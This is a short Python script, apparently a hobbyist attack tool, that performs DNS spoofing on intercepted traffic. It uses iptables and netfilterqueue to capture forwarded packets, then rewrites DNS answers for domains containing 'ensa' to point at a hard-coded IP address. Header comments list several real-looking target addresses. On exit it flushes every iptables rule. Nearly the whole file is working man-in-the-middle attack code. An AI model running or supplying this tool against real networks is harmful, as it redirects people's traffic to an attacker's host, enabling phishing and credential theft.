#!/usr/bin/env python
#ENSA IP: 196.200.152.230
#123Net 172.245.130.175
#Last page "35.242.133.245" 
import argparse
import subprocess
import netfilterqueue
import scapy.all as scapy
from scapy.layers.inet import IP,UDP
from scapy.layers.dns import DNS, DNSQR, DNSRR

DEST = "ensa"
RDEST ="172.245.130.175"

def spoof_dns(pkt, qname):
   pkt[DNS].an = DNSRR(rrname=qname, rdata=RDEST)
   #to avoid pkt to be corrupted
   pkt[DNS].ancount = 1
   del pkt[IP].len
   del pkt[IP].chksum
   del pkt[UDP].len
   del pkt[UDP].chksum
   return pkt

def process_pkt(pkt) :
   scapy_pkt = IP(pkt.get_payload())
   if scapy_pkt.haslayer(DNSRR):
      qname = scapy_pkt[DNSQR].qname
      print("[!] DNS Request Response for "+ qname)
      if DEST in qname :
         print("[+] Spoofing for "+ DEST + " with : "+ RDEST)
         spoofed_pkt = spoof_dns(scapy_pkt, qname)
         #edit the pkt to send
         pkt.set_payload(str(spoofed_pkt))
      print("-------------------------------------------------------------")

   pkt.accept()

# put recieved packets in a queue Quenum=0
try : 
   subprocess.call("iptables -I FORWARD -j NFQUEUE --queue-num 0",shell=True)
   #subprocess.call("iptables -I INPUT -j NFQUEUE --queue-num 0",shell=True)
   #subprocess.call("iptables -I OUTPUT -j NFQUEUE --queue-num 0",shell=True)

   queue = netfilterqueue.NetfilterQueue()
   queue.bind(0, process_pkt)
   queue.run()

except KeyboardInterrupt:
   print("\n[-] Ctrl+C detected ....iptables flushed")
   #flush ip table to emmpty queue 0
   subprocess.call("iptables --flush",shell=True)
   print("[-] .....Quiting")

